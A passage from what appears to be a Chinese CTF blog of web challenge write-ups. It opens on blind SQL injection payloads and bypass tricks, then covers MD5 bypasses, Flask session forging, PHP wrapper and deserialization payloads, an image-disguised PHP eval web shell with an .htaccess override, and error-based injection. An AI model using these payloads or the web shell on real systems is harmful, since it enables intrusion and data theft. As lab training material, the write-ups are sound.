<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152447135.png" alt="image-20221125152447135"></p>
<p>benchmark() //重复执行表达式一定次数达到页面返回延时 if(condition,true_statement,false_statement) //依据表达式的真假执行不同的语句</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152453749.png" alt="image-20221125152453749"></p>
<p>if(condition,true_statement,false_statement)//若表达式为真，执行true_statement ；表达式为假， false_statement</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152500665.png" alt="image-20221125152500665"></p>
<p><strong>延时盲注payload</strong></p>
<p>select if(ascii(substr(concat(‘abc’,’def’),4,1))=100,sleep(3),null); //若拼接字符串的第四个字符的ascii码</p>
<p>值为100，数据库休眠3秒，否则不做任何操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152527857.png" alt="image-20221125152527857"></p>
<p>?id=1’ and if(ascii(substr(database(),1,1))=117,sleep(3),null) %23 //若数据库名第一个字符的ASCII值是 99，则页面休眠3秒</p>
<p><strong>payload举例</strong></p>
<p>拿到数据库名第一个字符的payload</p>
<p>?id=1’and if(ascii(substr(database(),1,1))=117,sleep(1),null) and ‘1’=’1</p>
<p>拿到表名集合第二个字符的payload</p>
<p>?id=1’and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),2,1))=108,sleep(1),null) and ‘1’=’1</p>
<p>拿到列名集合第三个字符的payload</p>
<p>?id=1’and if(ascii(substr((select group_concat(column_name) from information_schema.columns</p>
<p>where table_schema=database() and table_name=’flags’),3,1))=97,sleep(1),null) and ‘1’=’1</p>
<p>拿到数据第四个字符的payload</p>
<p>?id=1’and if(ascii(substr((select flag from flags limit 0,1),4,1))=103,sleep(1),null) and ‘1’=’1</p>
<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><p>十六进制、ASCII码绕过引号 char</p>
<p><a target="_blank" rel="noopener" href="http://tools.bugscaner.com/text/zifuchuanzhuanhex.html">http://tools.bugscaner.com/text/zifuchuanzhuanhex.html</a></p>
<p>like、in、regex绕过等号：substr(password,1,1) like(‘p’); substr(password,1,1) in(‘p’);</p>
<p>逗号被过滤：select * from (select 1)a join (select 2)b、substr(password from 1 for 1) </p>
<p>空格被过滤：/**/、%0d %0a %0c %0b %a0 %09、+</p>
<p>大小写绕过：unIOn SeLeCt</p>
<p>&amp;&amp;代替and、||代替or、|代替xor、^位异或、～取反、!非 在查询时使用一个不存在的函数就能报错出数据库的名字 </p>
<p>等价函数：</p>
<p>hex() 、 bin() 《 == 》 ascii()； </p>
<p>sleep() 《 == 》 benchmark()； </p>
<p>mid()、substr()《==》substring()</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/11/19/buu-web/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/11/19/buu-web/" class="post-title-link" itemprop="url">buu_web（21-xx)</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-11-19 01:20:22" itemprop="dateCreated datePublished" datetime="2022-11-19T01:20:22+08:00">2022-11-19</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-11-26 20:52:07" itemprop="dateModified" datetime="2022-11-26T20:52:07+08:00">2022-11-26</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>进入题目是一个提交框</p>
<p><img src="https://img2020.cnblogs.com/blog/2096968/202109/2096968-20210902164007218-300602356.png"></p>
<p>输入123后发现有个password参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dfb23547-d218-4f2a-a8bd-27929456beb7.node4.buuoj.cn:81/leveldo4.php?password=123</span><br></pre></td></tr></table></figure>

<p>尝试了下一些常规的sql注入发现没反应，发现响应头有个hint</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint:select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>

<p>这里的MD5我们用ffifdyop来进行绕过，原理是ffifdyop这个字符串被 md5 哈希了之后会变成<br>276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6。而 Mysql 刚好又会吧 hex<br>转成 ascii 解释，因此拼接之后的形式是1select * from ‘admin’ where password=’’ or<br>‘6xxxxx’，进入构成一个永真式。</p>
<p>绕过后查看源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a = $GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line"></span><br><span class="line">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    // wow, glzjin wants a girl friend.</span><br></pre></td></tr></table></figure>

<p>用get的方式给a和b传参，且进行判断</p>
<p>这里payload是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/levels91.php?a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure>

<p>然后又出现一个页面，直接显示源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>同样的绕过方式只是是通过post方式传参</p>
<p>flag:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d7947c55-1a3c-473e-ad6a-00e7ec06cdc6&#125; </span><br></pre></td></tr></table></figure>

<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>首先进入网站，有登录和注册，注册了一个账号后在change界面找到hint，可以找到网站的源码</p>
<p><img src="https://tuchuangs.com/imgs/2022/11/19/cbe25ec4166ed039.png"></p>
<p>在源码中发现只要账号的session是admin后就会打印出flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include(&#x27;header.html&#x27;) %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated %&#125;</span><br><span class="line">&lt;h1 class=&quot;nav&quot;&gt;Hello &#123;&#123; session[&#x27;name&#x27;] &#125;&#125;&lt;/h1&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated and session[&#x27;name&#x27;] == &#x27;admin&#x27; %&#125;</span><br><span class="line">&lt;h1 class=&quot;nav&quot;&gt;hctf&#123;xxxxxxxxx&#125;&lt;/h1&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&lt;!-- you are not admin --&gt;</span><br><span class="line">&lt;h1 class=&quot;nav&quot;&gt;Welcome to hctf&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&#123;% include(&#x27;footer.html&#x27;) %&#125;</span><br></pre></td></tr></table></figure>

<p>先用解密脚本跑一下自己注册的账号的session</p>
<p>解密脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask.sessions import session_json_serializer</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line"></span><br><span class="line">def decryption(payload):</span><br><span class="line">    payload, sig = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line">    payload, timestamp = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line"></span><br><span class="line">    decompress = False</span><br><span class="line">    if payload.startswith(b&#x27;.&#x27;):</span><br><span class="line">        payload = payload[1:]</span><br><span class="line">        decompress = True</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise Exception(&#x27;Could not base64 decode the payload because of &#x27;</span><br><span class="line">                         &#x27;an exception&#x27;)</span><br><span class="line"></span><br><span class="line">    if decompress:</span><br><span class="line">        try:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            raise Exception(&#x27;Could not zlib decompress the payload before &#x27;</span><br><span class="line">                             &#x27;decoding the payload&#x27;)</span><br><span class="line"></span><br><span class="line">    return session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(decryption(sys.argv[1].encode()))youlin@youlin-virtual-machine:~/web$ cat session.py </span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask.sessions import session_json_serializer</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line"></span><br><span class="line">def decryption(payload):</span><br><span class="line">    payload, sig = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line">    payload, timestamp = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line"></span><br><span class="line">    decompress = False</span><br><span class="line">    if payload.startswith(b&#x27;.&#x27;):</span><br><span class="line">        payload = payload[1:]</span><br><span class="line">        decompress = True</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise Exception(&#x27;Could not base64 decode the payload because of &#x27;</span><br><span class="line">                         &#x27;an exception&#x27;)</span><br><span class="line"></span><br><span class="line">    if decompress:</span><br><span class="line">        try:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            raise Exception(&#x27;Could not zlib decompress the payload before &#x27;</span><br><span class="line">                             &#x27;decoding the payload&#x27;)</span><br><span class="line"></span><br><span class="line">    return session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(decryption(sys.argv[1].encode()))</span><br></pre></td></tr></table></figure>

<img src = 'https://tuchuangs.com/imgs/2022/11/19/48b124f7f04c1bc0.png' />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">youlin@youlin-virtual-machine:~/web$ python session.py .eJw9UEuLwjAQ_ivLnD3UPi6CB6GutDAjW1JDchFta5vEKlSlNOJ_31kXPAwMfPO95gn709DcOljch0czg72pYfGEryMsAK2blG1j9DxpO0dfTVuBAW5yp3zlUaiY-tyiX0WUulj52pDI_FZ0vbJlTF5FZFuPPYbblKyW-qzketRWd1pUI4ky1iILSWCEYdGpcMf82ihfOJQle-4ceQxRFB3KnVXCMTebK_mTkC0MZ0pQFnxfLeE1g-o2nPb3q2sunwoUZhNHi7T8NrwHxGExdQFarpHWlja5UfbPbp2g11yL7VbLt5zpD23zUarTfCzHf-Ry6BmA6fo4mwvM4HFrhvfjYB7A6xeCPG4Q.Y3iTyA.jV0tqYnpLbmzD9wE9Yh_AhC-BxI</span><br><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;292b883880853729340bdc731686bc307498c7b52398fb587676832c683cefeaa0f6ae70558e265373daceb57bc4d1e805d73614a1eca90f25ad964b0891dbc7&#x27;, &#x27;csrf_token&#x27;: b&#x27;7b2497eab7b463309423407c4bbb4d1a936dc360&#x27;, &#x27;image&#x27;: b&#x27;t2pS&#x27;, &#x27;name&#x27;: &#x27;youlin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到只需要将自己注册的name的youlin改为admin之后就可以了</p>
<p>git clone 大佬给出的 flask session 加密py地址：<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">flask_session_cookie_manager</a></p>
<p>在加密代码中 需要一个 secret_key 的值，这个值在 题目源码中 也可以找到，然后构造好自己的 session 再进行加密。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/a90be6e676cd1d23accfe21ef9868cac.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;292b883880853729340bdc731686bc307498c7b52398fb587676832c683cefeaa0f6ae70558e265373daceb57bc4d1e805d73614a1eca90f25ad964b0891dbc7&#x27;, &#x27;csrf_token&#x27;: b&#x27;7b2497eab7b463309423407c4bbb4d1a936dc360&#x27;, &#x27;image&#x27;: b&#x27;t2pS&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>就可以得到对应的session的内容，然后利用bp进行抓包修改session发送后就可以得到flag</p>
<p><img src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\1668847091154.png" alt="1668847091154"></p>
<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>打开题目就可以直接看到题目源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>这道题考点：<strong>php伪协议</strong></p>
<p><img src="https://img-blog.csdnimg.cn/20201115161452915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dvNDFnZQ==,size_16,color_FFFFFF,t_70#pic_center"></p>
<p>首先看第一个判断，text文件里面的内容等于”welcome to the zjctf”</p>
<p>通过data协议进行绕过，一般情况是需要base64加密的，为了绕过某些过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data:<span class="comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span></span><br></pre></td></tr></table></figure>

<p><strong>加上第二个绕过：（php://filter用于读取源码）</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data:<span class="comment">//text//plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span></span><br></pre></td></tr></table></figure>

<p>进行base64解码得到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>

<p><strong>第三个绕过：（反序列化）</strong></p>
<p>进行测试就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file=&quot;flag.php&quot;;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a = new Flag();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>所以最终的payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data:<span class="comment">//text//plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>flag:flag{cda1d469-1b5b-43aa-9cf2-28d1b99c5b20}</p>
<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>一个很特别的文件上传界面</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221126202516147.png" alt="image-20221126202516147"></p>
<p>只可以上传图片，php,phtml等后缀都被过滤了，首先上传一个图片马1.png</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a? </span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;cmd&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>接着上传一个**.htaccess**文件</p>
<p>.htaccess是什么</p>
<p>启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。</p>
<p>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p>
<p>那么现在开始写一个.htaccess文件，里面的内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.png&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>注意里面的1.png要和你刚才上传的文件名一样，接着上传，需要使用bp进行绕过</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221126202859568.png" alt="image-20221126202859568"></p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221126203225566.png" alt="image-20221126203225566"></p>
<p>显示上传成功后就可以直接使用蚁剑链接了，flag在根目录</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221126204523224.png" alt="image-20221126204523224"></p>
<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>和之前几个sql注入题一样的界面，先用bp fuzz测试一下过滤了哪些词</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a78a3232ffb3">利用burpsuit对xss和sql注入进行fuzz</a>（主要就是利用bp的intruder模块进行爆破，看长进行判断，响应为736都被过滤，响应为751的没有被过滤）</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125225257899.png" alt="image-20221125225257899"></p>
<p>构造注入语句（在用户中输入的）<br> 1.查询数据库：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27;or(updatexml(1,concat(0x7e,database()),1))#</span></span><br></pre></td></tr></table></figure>

<p>爆出数据库名为geek</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125225322290.png" alt="image-20221125225322290"></p>
<p>2.查询表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),1))#</span></span><br></pre></td></tr></table></figure>

<p>得到表名H4rDsq1</p>
<p>3.查字段名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>H4rDsq1<span class="string">&#x27;))),1))#</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>得到字段名为id,username,password</p>
<p>4.爆数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(username,&#x27;</span><span class="operator">~</span><span class="string">&#x27;,password))from(H4rDsq1))),1))#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125225645447.png" alt="image-20221125225645447"></p>
<p>数据库中第一条数据就是flag</p>
<p>flag没显示完,原因是报错内容最大字符数为32，后面的就不会再显示<br> 这样，我们可以使用left和right函数先查左边，再查右边，然后拼接在一起就能得到flag</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)where(username)like(&#x27;</span>flag<span class="string">&#x27;))),1))#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125225746019.png" alt="image-20221125225746019"></p>
<p>拼接后得到完整flag:</p>
<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>进入页面后直接给出了源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$gg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5(<span 